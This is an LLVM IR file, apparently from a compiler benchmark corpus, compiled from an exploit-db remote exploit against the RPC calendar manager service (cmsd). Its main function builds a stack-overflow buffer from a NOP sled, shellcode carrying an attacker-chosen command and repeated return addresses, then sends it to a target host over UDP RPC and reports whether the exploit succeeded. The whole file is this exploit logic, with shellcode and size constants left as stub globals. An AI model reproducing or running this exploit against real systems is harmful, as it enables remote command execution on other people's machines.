; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19421.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19421.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i32 }
%struct.TYPE_5__ = type { i32 }
%struct.cm_send = type { i8*, i8* }
%struct.cm_reply = type { i32 }

@BUFFER_SIZE = common dso_local global i32 0, align 4
@__const.main.tm = private unnamed_addr constant %struct.timeval { i32 10, i32 0 }, align 4
@.str = private unnamed_addr constant [41 x i8] c"Usage: %s [hostname] [command] [offset]\0A\00", align 1
@shell = common dso_local global i8* null, align 8
@LEN = common dso_local global i32 0, align 4
@NOP = common dso_local global i8 0, align 1
@RET_LENGTH = common dso_local global i32 0, align 4
@ADJUST = common dso_local global i32 0, align 4
@SHELL_START = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [11 x i8] c"host = %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"command = '%s'\0A\00", align 1
@.str.3 = private unnamed_addr constant [20 x i8] c"ret address = 0x%x\0A\00", align 1
@.str.4 = private unnamed_addr constant [18 x i8] c"buffer size = %d\0A\00", align 1
@.str.5 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@CMSD_PROG = common dso_local global i32 0, align 4
@CMSD_VERS = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [4 x i8] c"udp\00", align 1
@.str.7 = private unnamed_addr constant [12 x i8] c"clnt_create\00", align 1
@.str.8 = private unnamed_addr constant [46 x i8] c"exploit failed; unable to contact RPC server\0A\00", align 1
@.str.9 = private unnamed_addr constant [10 x i8] c"localhost\00", align 1
@CMSD_PROC = common dso_local global i32 0, align 4
@xdr_cm_send = common dso_local global i32 0, align 4
@xdr_cm_reply = common dso_local global i32 0, align 4
@RPC_SUCCESS = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [21 x i8] c"exploit is failed!!\0A\00", align 1
@.str.11 = private unnamed_addr constant [29 x i8] c"Maybe, exploit is success!!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca %struct.TYPE_5__*, align 8
  %16 = alloca %struct.cm_send, align 8
  %17 = alloca %struct.cm_reply, align 4
  %18 = alloca %struct.timeval, align 4
  %19 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %20 = load i32, i32* @BUFFER_SIZE, align 4
  %21 = add nsw i32 %20, 1
  %22 = zext i32 %21 to i64
  %23 = call i8* @llvm.stacksave()
  store i8* %23, i8** %6, align 8
  %24 = alloca i8, i64 %22, align 16
  store i64 %22, i64* %7, align 8
  %25 = bitcast %struct.timeval* %18 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %25, i8* align 4 bitcast (%struct.timeval* @__const.main.tm to i8*), i64 8, i1 false)
  %26 = load i32, i32* %4, align 4
  %27 = icmp slt i32 %26, 3
  br i1 %27, label %31, label %28

28:                                               ; preds = %2
  %29 = load i32, i32* %4, align 4
  %30 = icmp sgt i32 %29, 4
  br i1 %30, label %31, label %37

31:                                               ; preds = %28, %2
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str, i64 0, i64 0), i8* %34)
  %36 = call i32 @exit(i32 1) #5
  unreachable

37:                                               ; preds = %28
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  store i8* %40, i8** %14, align 8
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 2
  %43 = load i8*, i8** %42, align 8
  store i8* %43, i8** %13, align 8
  %44 = load i32, i32* %4, align 4
  %45 = icmp eq i32 %44, 4
  br i1 %45, label %46, label %51

46:                                               ; preds = %37
  %47 = load i8**, i8*** %5, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 3
  %49 = load i8*, i8** %48, align 8
  %50 = call i64 @atol(i8* %49)
  store i64 %50, i64* %9, align 8
  br label %52

51:                                               ; preds = %37
  store i64 0, i64* %9, align 8
  br label %52

52:                                               ; preds = %51, %46
  %53 = load i8*, i8** %13, align 8
  %54 = call i32 @strlen(i8* %53)
  store i32 %54, i32* %10, align 4
  %55 = load i32, i32* %10, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %10, align 4
  %57 = load i32, i32* %10, align 4
  %58 = sub nsw i32 0, %57
  store i32 %58, i32* %10, align 4
  %59 = load i32, i32* %10, align 4
  %60 = ashr i32 %59, 0
  %61 = and i32 %60, 255
  %62 = trunc i32 %61 to i8
  %63 = load i8*, i8** @shell, align 8
  %64 = load i32, i32* @LEN, align 4
  %65 = add nsw i32 %64, 0
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %63, i64 %66
  store i8 %62, i8* %67, align 1
  %68 = load i32, i32* %10, align 4
  %69 = ashr i32 %68, 8
  %70 = and i32 %69, 255
  %71 = trunc i32 %70 to i8
  %72 = load i8*, i8** @shell, align 8
  %73 = load i32, i32* @LEN, align 4
  %74 = add nsw i32 %73, 1
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8, i8* %72, i64 %75
  store i8 %71, i8* %76, align 1
  %77 = load i32, i32* %10, align 4
  %78 = ashr i32 %77, 16
  %79 = and i32 %78, 255
  %80 = trunc i32 %79 to i8
  %81 = load i8*, i8** @shell, align 8
  %82 = load i32, i32* @LEN, align 4
  %83 = add nsw i32 %82, 2
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  store i8 %80, i8* %85, align 1
  %86 = load i32, i32* %10, align 4
  %87 = ashr i32 %86, 24
  %88 = and i32 %87, 255
  %89 = trunc i32 %88 to i8
  %90 = load i8*, i8** @shell, align 8
  %91 = load i32, i32* @LEN, align 4
  %92 = add nsw i32 %91, 3
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* %90, i64 %93
  store i8 %89, i8* %94, align 1
  %95 = load i8*, i8** %13, align 8
  %96 = call i32 @strlen(i8* %95)
  %97 = add nsw i32 %96, 27
  %98 = trunc i32 %97 to i8
  %99 = load i8*, i8** @shell, align 8
  %100 = getelementptr inbounds i8, i8* %99, i64 30
  store i8 %98, i8* %100, align 1
  %101 = call i64 (...) @get_ret()
  %102 = load i64, i64* %9, align 8
  %103 = add nsw i64 %101, %102
  store i64 %103, i64* %8, align 8
  store i32 0, i32* %11, align 4
  br label %104

104:                                              ; preds = %113, %52
  %105 = load i32, i32* %11, align 4
  %106 = load i32, i32* @BUFFER_SIZE, align 4
  %107 = icmp slt i32 %105, %106
  br i1 %107, label %108, label %116

108:                                              ; preds = %104
  %109 = load i8, i8* @NOP, align 1
  %110 = load i32, i32* %11, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds i8, i8* %24, i64 %111
  store i8 %109, i8* %112, align 1
  br label %113

113:                                              ; preds = %108
  %114 = load i32, i32* %11, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %11, align 4
  br label %104

116:                                              ; preds = %104
  %117 = load i32, i32* @BUFFER_SIZE, align 4
  %118 = load i32, i32* @RET_LENGTH, align 4
  %119 = sub nsw i32 %117, %118
  %120 = load i8*, i8** @shell, align 8
  %121 = call i32 @strlen(i8* %120)
  %122 = sub nsw i32 %119, %121
  %123 = load i8*, i8** %13, align 8
  %124 = call i32 @strlen(i8* %123)
  %125 = sub nsw i32 %122, %124
  %126 = sub nsw i32 %125, 1
  %127 = load i32, i32* @ADJUST, align 4
  %128 = sub nsw i32 %126, %127
  store i32 %128, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %129

129:                                              ; preds = %144, %116
  %130 = load i32, i32* %12, align 4
  %131 = load i8*, i8** @shell, align 8
  %132 = call i32 @strlen(i8* %131)
  %133 = icmp slt i32 %130, %132
  br i1 %133, label %134, label %147

134:                                              ; preds = %129
  %135 = load i8*, i8** @shell, align 8
  %136 = load i32, i32* %12, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8, i8* %135, i64 %137
  %139 = load i8, i8* %138, align 1
  %140 = load i32, i32* %11, align 4
  %141 = add nsw i32 %140, 1
  store i32 %141, i32* %11, align 4
  %142 = sext i32 %140 to i64
  %143 = getelementptr inbounds i8, i8* %24, i64 %142
  store i8 %139, i8* %143, align 1
  br label %144

144:                                              ; preds = %134
  %145 = load i32, i32* %12, align 4
  %146 = add nsw i32 %145, 1
  store i32 %146, i32* %12, align 4
  br label %129

147:                                              ; preds = %129
  store i32 0, i32* %12, align 4
  br label %148

148:                                              ; preds = %163, %147
  %149 = load i32, i32* %12, align 4
  %150 = load i8*, i8** %13, align 8
  %151 = call i32 @strlen(i8* %150)
  %152 = icmp slt i32 %149, %151
  br i1 %152, label %153, label %166

153:                                              ; preds = %148
  %154 = load i8*, i8** %13, align 8
  %155 = load i32, i32* %12, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds i8, i8* %154, i64 %156
  %158 = load i8, i8* %157, align 1
  %159 = load i32, i32* %11, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %11, align 4
  %161 = sext i32 %159 to i64
  %162 = getelementptr inbounds i8, i8* %24, i64 %161
  store i8 %158, i8* %162, align 1
  br label %163

163:                                              ; preds = %153
  %164 = load i32, i32* %12, align 4
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* %12, align 4
  br label %148

166:                                              ; preds = %148
  %167 = load i32, i32* %11, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i8, i8* %24, i64 %168
  store i8 -1, i8* %169, align 1
  %170 = load i32, i32* @SHELL_START, align 4
  store i32 %170, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %171

171:                                              ; preds = %183, %166
  %172 = load i32, i32* %12, align 4
  %173 = load i32, i32* @RET_LENGTH, align 4
  %174 = sdiv i32 %173, 4
  %175 = icmp slt i32 %172, %174
  br i1 %175, label %176, label %188

176:                                              ; preds = %171
  %177 = load i64, i64* %8, align 8
  %178 = trunc i64 %177 to i32
  %179 = load i32, i32* %11, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds i8, i8* %24, i64 %180
  %182 = bitcast i8* %181 to i32*
  store i32 %178, i32* %182, align 1
  br label %183

183:                                              ; preds = %176
  %184 = load i32, i32* %12, align 4
  %185 = add nsw i32 %184, 1
  store i32 %185, i32* %12, align 4
  %186 = load i32, i32* %11, align 4
  %187 = add nsw i32 %186, 4
  store i32 %187, i32* %11, align 4
  br label %171

188:                                              ; preds = %171
  %189 = load i32, i32* %11, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds i8, i8* %24, i64 %190
  store i8 0, i8* %191, align 1
  %192 = load i8*, i8** %14, align 8
  %193 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0), i8* %192)
  %194 = load i8*, i8** %13, align 8
  %195 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0), i8* %194)
  %196 = load i64, i64* %8, align 8
  %197 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0), i64 %196)
  %198 = call i32 @strlen(i8* %24)
  %199 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.4, i64 0, i64 0), i32 %198)
  %200 = getelementptr inbounds %struct.cm_send, %struct.cm_send* %16, i32 0, i32 0
  store i8* %24, i8** %200, align 8
  %201 = getelementptr inbounds %struct.cm_send, %struct.cm_send* %16, i32 0, i32 1
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.5, i64 0, i64 0), i8** %201, align 8
  %202 = load i8*, i8** %14, align 8
  %203 = load i32, i32* @CMSD_PROG, align 4
  %204 = load i32, i32* @CMSD_VERS, align 4
  %205 = call %struct.TYPE_5__* @clnt_create(i8* %202, i32 %203, i32 %204, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0))
  store %struct.TYPE_5__* %205, %struct.TYPE_5__** %15, align 8
  %206 = load %struct.TYPE_5__*, %struct.TYPE_5__** %15, align 8
  %207 = icmp eq %struct.TYPE_5__* %206, null
  br i1 %207, label %208, label %212

208:                                              ; preds = %188
  %209 = call i32 @clnt_pcreateerror(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.7, i64 0, i64 0))
  %210 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.8, i64 0, i64 0))
  %211 = call i32 @exit(i32 1) #5
  unreachable

212:                                              ; preds = %188
  %213 = call i32 @authunix_create(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i64 0, i64 0), i32 0, i32 0, i32 0, i32* null)
  %214 = load %struct.TYPE_5__*, %struct.TYPE_5__** %15, align 8
  %215 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %214, i32 0, i32 0
  store i32 %213, i32* %215, align 4
  %216 = load %struct.TYPE_5__*, %struct.TYPE_5__** %15, align 8
  %217 = load i32, i32* @CMSD_PROC, align 4
  %218 = load i32, i32* @xdr_cm_send, align 4
  %219 = ptrtoint %struct.cm_send* %16 to i32
  %220 = load i32, i32* @xdr_cm_reply, align 4
  %221 = ptrtoint %struct.cm_reply* %17 to i32
  %222 = bitcast %struct.timeval* %18 to i64*
  %223 = load i64, i64* %222, align 4
  %224 = call i32 @clnt_call(%struct.TYPE_5__* %216, i32 %217, i32 %218, i32 %219, i32 %220, i32 %221, i64 %223)
  store i32 %224, i32* %19, align 4
  %225 = load i32, i32* %19, align 4
  %226 = load i32, i32* @RPC_SUCCESS, align 4
  %227 = icmp eq i32 %225, %226
  br i1 %227, label %228, label %233

228:                                              ; preds = %212
  %229 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.10, i64 0, i64 0))
  %230 = load %struct.TYPE_5__*, %struct.TYPE_5__** %15, align 8
  %231 = call i32 @clnt_destroy(%struct.TYPE_5__* %230)
  %232 = call i32 @exit(i32 1) #5
  unreachable

233:                                              ; preds = %212
  %234 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.11, i64 0, i64 0))
  %235 = load %struct.TYPE_5__*, %struct.TYPE_5__** %15, align 8
  %236 = call i32 @clnt_destroy(%struct.TYPE_5__* %235)
  %237 = call i32 @exit(i32 0) #5
  unreachable
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @printf(i8*, ...) #3

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #4

declare dso_local i64 @atol(i8*) #3

declare dso_local i32 @strlen(i8*) #3

declare dso_local i64 @get_ret(...) #3

declare dso_local %struct.TYPE_5__* @clnt_create(i8*, i32, i32, i8*) #3

declare dso_local i32 @clnt_pcreateerror(i8*) #3

declare dso_local i32 @authunix_create(i8*, i32, i32, i32, i32*) #3

declare dso_local i32 @clnt_call(%struct.TYPE_5__*, i32, i32, i32, i32, i32, i64) #3

declare dso_local i32 @clnt_destroy(%struct.TYPE_5__*) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
